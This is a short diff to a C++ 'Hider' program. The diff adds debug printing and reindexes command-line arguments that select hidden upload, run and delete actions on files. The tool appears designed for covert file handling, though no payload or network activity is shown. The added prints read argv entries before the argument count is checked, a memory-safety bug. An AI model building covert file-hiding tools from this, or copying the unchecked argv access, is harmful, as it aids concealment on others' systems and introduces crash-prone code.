@@ -10,18 +10,24 @@ Hider::Hider() : handel(HiddenFileHandler()) {}
 uint Hider::manage_files(int argc, char* argv[])
 {
 	std::string line;
-	if (argc < 2) {
+	std::cerr << "hider argc: " << argc << std::endl;
+	std::cerr << "hider argv[0]: " << argv[0] << std::endl;
+	std::cerr << "hider argv[1]: " << argv[1] << std::endl;
+	std::cerr << "hider argv[2]: " << argv[2] << std::endl;
+
+	if (argc < 3) {
 		return HIDER_NO_ARGUMENTS_ERROR;
 	}
-	uint32_t fncode = decodeInt(std::string(argv[1]));
-	uint32_t uploadLen = decodeInt(std::string(argv[2]));
-	std::string stringParam = decodeStr(std::string(argv[3]));
+	uint32_t fncode = decodeInt(std::string(argv[0]));
+	uint32_t uploadLen = decodeInt(std::string(argv[1]));
+	std::string stringParam = decodeStr(std::string(argv[2]));
 
 	// TODO better Status handling
 	responce res_upload = {.dataLen = 0, .status = SUCCSESS};
 	responce res_run = {.dataLen = 0, .status = SUCCSESS};
 	responce res_delete = {.dataLen = 0, .status = SUCCSESS};
 
+	std::cerr << "starting hidden action" << std::endl;
 	if (fncode & HIDDEN_UPLOAD)
 	{
 		std::cerr << "start hidden uploading\n";
@@ -55,7 +61,7 @@ uint Hider::manage_files(int argc, char* argv[])
 }
 
 
-int main(int argc, char** argv) {
+int main(int argc, char* argv[]) {
 	std::cerr << "start hider\n";
 	
 	Hider hider = Hider();	
